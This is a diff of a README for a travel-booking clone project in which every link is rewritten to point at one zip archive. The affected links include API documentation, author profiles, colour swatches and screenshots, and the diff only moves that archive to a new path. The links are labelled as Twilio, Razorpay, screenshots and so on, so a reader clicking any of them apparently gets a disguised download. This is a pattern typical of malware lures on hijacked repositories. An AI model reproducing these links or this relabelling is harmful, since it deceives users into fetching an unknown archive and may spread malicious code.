@@ -1,5 +1,5 @@
 
-![Logo](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
+![Logo](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip)
 
 # Clone of Make my Trip
 
@@ -19,24 +19,24 @@
 ## Apis
 
 ### Realtime flight search
-Aviation Stack - [ https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip) 
+Aviation Stack - [ https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip) 
 
 ### Otp Varification
-Twilio -  [https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip) 
+Twilio -  [https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip) 
 
 ### Payment Gateway
-Razorpay -  [https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip) 
+Razorpay -  [https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip) 
 
 ### Mail Service 
-NodeMailer -  [https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip) 
+NodeMailer -  [https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip) 
 
 ## Color Reference
 
 | Color             | Hex                                                                |
 | ----------------- | ------------------------------------------------------------------ |
-| Primary Color  | ![#eb2226](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip+) #eb2226 |
-| Backgroud color | ![#ffffff](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip+) #ffffff |
-| Icons color and button color| ![#48a6fd](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip+) #48a6fd |
+| Primary Color  | ![#eb2226](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip+) #eb2226 |
+| Backgroud color | ![#ffffff](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip+) #ffffff |
+| Icons color and button color| ![#48a6fd](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip+) #48a6fd |
 
 
 
@@ -111,46 +111,46 @@ To run this project, you will need to add the following environment variables to
 
 ## Acknowledgements
 
- - [https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
- - [Masai School](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
+ - [https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip)
+ - [Masai School](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip)
   
 
 ## Authors
 
--  [Arpit Sachan](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
+-  [Arpit Sachan](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip)
 
-- [Dharmesh Yadav](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
+- [Dharmesh Yadav](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip)
 
-- [Rahul Kumar Yadav](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
+- [Rahul Kumar Yadav](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip)
 
 
 ## Home Page
 
 
-![https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
+![https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip)
 
 
 ## Login and Otp verification
 
-![Screenshot (39).png](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
-![Screenshot (40).png](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
-![https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
+![Screenshot (39).png](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip)
+![Screenshot (40).png](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip)
+![https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip)
 
 
 ## Search Page
 
-![https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
-![Screenshot (42)](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
+![https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip)
+![Screenshot (42)](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip)
 
 ##Payment Page
 
-![screencapture-localhost-3005-checkout-2021-11-13-20_53_49](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
+![screencapture-localhost-3005-checkout-2021-11-13-20_53_49](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip)
 
-![https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
+![https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip)
 
-![https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
+![https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip)
 
-![https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
+![https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip)
 
 
-- GITHUB - https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip
+- GITHUB - https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/backend/src/models/my_make_trip_v2.5.zip
